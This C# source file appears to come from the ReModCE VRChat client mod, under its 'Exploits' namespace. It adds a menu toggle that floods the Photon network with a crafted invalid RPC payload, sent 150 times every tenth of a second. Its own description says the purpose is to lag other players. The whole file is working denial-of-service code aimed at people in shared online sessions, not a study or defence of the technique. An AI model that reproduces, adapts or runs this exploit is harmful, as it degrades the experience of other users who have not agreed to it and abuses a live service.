using ReMod.Core;
using System;
using System.Collections;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ReModCE.PhotonExtension;
using ExitGames.Client.Photon;
using MelonLoader;
using Photon.Realtime;
using UnityEngine;
using VRC.SDKBase;
using ReMod.Core.UI.QuickMenu;
using ReMod.Core.Managers;
using ReModCE.Core;
using ReMod.Core.Unity;
using ReModCE.EvilEyeSDK;

namespace ReModCE.Exploits
{
    class Event6 : ModComponent
    {
        public bool _Event6Enabled;
        private static ReMenuToggle _Event6Toggled;

        public Event6()
        {
        }

        public override void OnUiManagerInit(UiManager uiManager)
        {
            var exploitsMenu = uiManager.MainMenu.GetCategoryPage("Exploits").GetCategory("Events");
            _Event6Toggled = exploitsMenu.AddToggle("Event 6", "Sends an invalid RPC to lag other people (not crash, may slightly lower the fps of other people.)", StartE6, _Event6Enabled);
        }

        public void StartE6(bool value)
        {
            _Event6Enabled = value;
            _Event6Toggled?.Toggle(value);

            if (_Event6Enabled)
            {
                MelonCoroutines.Start(StartE6());
            }
        }

        private IEnumerator StartE6()
        {
            byte[] rpcData =
            {
                106, 191, 218, 132, 88, 12, 0, 0, 0, 7,
                0, 58, 118, 213, 255, 255, 50, 47, 14, 0,
                255, 0, 0, 0, 0, 9, 0, 0, 0, 13,
                0, 69, 110, 97, 98, 108, 101, 77, 101, 115,
                104, 82, 80, 67, 0, 0, 0, 0, 0, 0,
                0, 2
            };

            Buffer.BlockCopy(BitConverter.GetBytes(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0.playerId), 0, rpcData, 5, 4);
            while (_Event6Enabled)
            {
                for (int i = 0; i < 150; i++)
                {
                    PhotonExtensions.OpRaiseEvent(6, rpcData, new RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = 0,
                        field_Public_EventCaching_0 = 0
                    }, default(SendOptions));
                }
                yield return new WaitForSecondsRealtime(0.1f);
            }
        }
    }
}
